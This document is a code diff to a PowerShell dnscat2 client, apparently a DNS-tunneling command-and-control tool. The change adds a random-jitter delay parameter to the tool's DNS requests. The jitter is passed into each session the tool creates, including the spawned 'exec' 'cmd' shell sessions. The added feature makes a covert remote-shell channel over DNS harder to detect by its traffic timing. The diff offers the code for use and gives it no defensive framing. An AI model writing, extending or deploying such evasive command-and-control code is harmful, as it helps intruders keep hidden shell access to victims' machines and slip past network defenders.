@@ -436,7 +436,7 @@ function Start-Dnscat2EncAuth ($Session) {
     return $Session
 }
 
-function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPort, $MaxPacketSize, $Encryption, $PreSharedSecret, $LookupTypes, $Delay, $Driver, $DriverOptions) {
+function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPort, $MaxPacketSize, $Encryption, $PreSharedSecret, $LookupTypes, $Delay, $MaxRandomDelay, $Driver, $DriverOptions) {
     $Session = New-Object System.Collections.Hashtable
     $Session["SessionId"] = $SessionId
     $Session["Domain"] = $Domain
@@ -449,6 +449,7 @@ function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPo
     $Session["Dead"] = $False
     $Session["NewSessions"] = New-Object System.Collections.Hashtable
     $Session["Delay"] = $Delay
+    $Session["MaxRandomDelay"] = $MaxRandomDelay
     $Session["LookupTypes"] = $LookupTypes
     $Session["SYNOptions"] = $Options
     
@@ -665,7 +666,7 @@ function Update-Dnscat2CommandSession ($Session) {
             {
                 try {
                     $NewSessionName = $Session.CommandFields
-                    $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0001" + $NewSessionName) $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Encryption $Session["EncryptionKeys"].PreSharedSecret $Session.LookupTypes $Session.Delay "exec" "cmd"
+                    $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0001" + $NewSessionName) $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Encryption $Session["EncryptionKeys"].PreSharedSecret $Session.LookupTypes $Session.Delay $Session.MaxRandomDelay "exec" "cmd"
                     $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                     $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                     $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0001" + $NewSession.SessionId)
@@ -691,7 +692,7 @@ function Update-Dnscat2CommandSession ($Session) {
                         $NewSessionCommand = ""
                     }
                     
-                    $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0001" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Encryption $Session["EncryptionKeys"].PreSharedSecret $Session.LookupTypes $Session.Delay $NewSessionDriver $NewSessionCommand
+                    $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0001" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Encryption $Session["EncryptionKeys"].PreSharedSecret $Session.LookupTypes $Session.Delay $Session.MaxRandomDelay $NewSessionDriver $NewSessionCommand
                     $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                     $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                     $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0002" + $NewSession.SessionId)
@@ -910,7 +911,7 @@ function Update-Dnscat2Session ($Session) {
         $PacketData = (Get-NextDnscat2Data $Session["DriverDataQueue"] $Session["MaxMSGDataSize"])
         
         # Delay
-        Sleep -Milliseconds $Session['Delay']
+        Sleep -Milliseconds ($Session['Delay'] + (Get-Random -Maximum $Session['MaxRandomDelay']))
         
         try {
             $MSGPACKET = (New-Dnscat2MSG $Session["Domain"] $Session["SessionId"] $Session["SequenceNumber"] $Session["AcknowledgementNumber"] $PacketData)
@@ -1000,6 +1001,9 @@ function Start-Dnscat2 {
     
     .PARAMETER Delay
         Set a delay between each request, in milliseconds. (Default: 0)
+        
+    .PARAMETER MaxRandomDelay
+        Set the max value of a random delay added to the normal delay, in milliseconds. (Default: 0)
     
     .PARAMETER MaxPacketSize
         Maximum length of a dnscat2 packet.
@@ -1021,6 +1025,7 @@ function Start-Dnscat2 {
         [Alias("ne")][switch]$NoEncryption=$false,
         [string[]]$LookupTypes=@("TXT","MX","CNAME"),
         [Alias("t")][int32]$Delay=0,
+        [Alias("r")][int32]$MaxRandomDelay=0,
         [ValidateRange(1,240)][int32]$MaxPacketSize=240,
         [Alias("n")][string]$Name=""
     )
@@ -1063,7 +1068,7 @@ function Start-Dnscat2 {
     
     $Sessions = New-Object System.Collections.Hashtable
     $DeadSessions = @()
-    $InitialSession = Start-Dnscat2Session (New-RandomDNSField 4) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize (-not $NoEncryption) $PreSharedSecret $LookupTypes $Delay $Driver $DriverOptions
+    $InitialSession = Start-Dnscat2Session (New-RandomDNSField 4) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize (-not $NoEncryption) $PreSharedSecret $LookupTypes $Delay $MaxRandomDelay $Driver $DriverOptions
     if ($InitialSession -eq 1) {
         return
     }
